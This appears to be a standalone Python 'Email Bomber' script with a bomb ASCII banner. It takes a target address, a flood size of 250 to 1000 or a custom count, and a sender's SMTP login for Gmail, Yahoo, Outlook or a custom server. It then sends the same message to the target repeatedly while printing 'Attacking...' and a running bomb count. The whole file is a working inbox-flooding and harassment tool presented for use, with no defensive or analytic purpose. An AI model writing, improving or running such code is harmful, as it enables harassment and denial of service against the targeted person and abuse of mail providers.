import smtplib
import sys

# Define class for text colors
class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

# Function to display the banner
def banner():
    print(bcolors.RED + ' Email Bomber ')
    print(bcolors.RED + '''                  
                 :      .        
        :..   :  : :  .          
           ..  ; :: .            
              ... .. :..         
             ::: :...            
         ::.:.:...;; .....       
      :..     .;.. :;     ..     
            . :. .  ;.           
             .: ;;: ;.           
            :; .BRRRV;           
               YB BMMMBR         
              ;BVIMMMMMt         
        .=YRBBBMMMMMMMB      
      =RMMMMMMMMMMMMMM;          
    ;BMMR=VMMMMMMMMMMMV.         
   tMMR::VMMMMMMMMMMMMMB:        
  tMMt ;BMMMMMMMMMMMMMMMB.       
 ;MMY ;MMMMMMMMMMMMMMMMMMV       
 XMB .BMMMMMMMMMMMMMMMMMMM:      
 BMI +MMMMMMMMMMMMMMMMMMMMi      
.MM= XMMMMMMMMMMMMMMMMMMMMY      
 BMt YMMMMMMMMMMMMMMMMMMMMi      
 VMB +MMMMMMMMMMMMMMMMMMMM:      
 ;MM+ BMMMMMMMMMMMMMMMMMMR       
  tMBVBMMMMMMMMMMMMMMMMMB.       
   tMMMMMMMMMMMMMMMMMMMB:        
    ;BMMMMMMMMMMMMMMMMY          
      +BMMMMMMMMMMMBY:           
        :+YRBBBRVt;    Made by: Oziesiek
    ''')

# Email_Bomber class definition
class Email_Bomber:
    count = 0

    # Constructor to initialize target email and bombing mode
    def __init__(self):
        try:
            print(bcolors.GREEN + '\n Starting program ')
            self.target = str(input(bcolors.YELLOW + 'Enter target email <: '))
            self.mode = int(input(bcolors.YELLOW + 'Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250 4(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. Goodbye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    # Function to set up bombing parameters
    def bomb(self):
        try:
            print(bcolors.GREEN + '\n Setting up bomb ')
            self.amout = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choose a CUSTOM amount <; '))
            print(bcolors.GREEN + f'\n "You have selected BOMB mode: {self.mode} and {self.amount} emails')
        except Exception as e:
            print(f'ERROR: {e}')
            
    # Function to set up email parameters
    def email(self):
        try:
            print(bcolors.GREEN + ' Setting up email ')
            self.server = str(input(bcolors.YELLOW + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.YELLOW + 'Enter port number <:'))
            
            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'
            
            self.fromAddr = str(input(bcolors.GREEN + 'Enter from address <: '))
            self.fromPWD = str(input(bcolors.GREEN + 'Enter from password <: '))
            self.subject = str(input(bcolors.GREEN + 'Enter subject <: '))
            self.message = str(input(bcolors.GREEN + 'Enter message <: '))

            self.msg = f"From: {self.fromAddr}\nTo: {self.target}\nSubject: {self.subject}\n\n{self.message}"

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPWD)
        except Exception as e:
            print(f'ERROR: {e}')

    # Function to send emails
    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.RED + f'BOMB: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    # Main function to perform the email bombing attack
    def attack(self):
        print(bcolors.RED + ' Attacking... ')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + ' Attack finished ')
        sys.exit(0)
        
# Entry point of the program
if __name__ == '__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()










